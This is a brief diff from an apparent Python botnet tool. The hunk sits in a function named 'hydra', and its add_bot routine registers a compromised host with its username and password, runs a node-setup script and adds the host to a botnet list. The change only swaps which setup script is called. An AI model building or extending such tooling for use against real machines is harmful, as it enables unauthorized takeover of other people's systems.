@@ -88,7 +88,7 @@ def hydra(hosts):
 botnet = []
 def add_bot(host, user, password):
     new_bot = Bot(host, user, password)
-    output = subprocess.Popen(['./initialize_new_node.sh'], stdout = subprocess.PIPE)
+    output = subprocess.Popen(['python add_node.py'], stdout = subprocess.PIPE)
     response = output.communicate()[0]
     str_res = response.decode("utf-8")
     botnet.append(new_bot)
